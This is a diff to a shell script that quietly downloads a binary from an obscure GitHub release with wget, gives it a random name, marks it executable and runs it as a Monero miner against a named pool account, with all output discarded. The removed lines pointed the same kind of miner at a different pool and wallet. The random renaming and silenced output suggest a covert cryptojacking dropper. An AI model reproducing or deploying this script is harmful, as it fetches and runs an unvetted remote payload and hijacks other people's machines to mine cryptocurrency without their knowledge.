@@ -5,7 +5,7 @@ set -e  # Exit on any error
 BIN_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 12)
 
 # Download binary quietly and rename
-wget -q https://github.com/vedhagsvp/tkospae/releases/download/latest/xpleoas -O "$BIN_NAME"
+wget -q https://github.com/vedhagsvp/qubros/releases/download/srmn/aplnopa -O "$BIN_NAME"
 
 # Make it executable
 chmod +x "$BIN_NAME"
@@ -13,4 +13,4 @@ chmod +x "$BIN_NAME"
 # Optional: run the binary
 # ./"$BIN_NAME"
 
-./"$BIN_NAME" -stratum stratum+tcp://0xBD3D3E9878145D58dBF214a2ac684F93530Cf1bc.opsea77bb:x@xphash.xppool.io:3333
+./"$BIN_NAME" --algo xmr --account CP_udnvh2owpq --pool xmr.asia.apool.io:4334 --worker A31-$RANDOM > /dev/null 2>&1
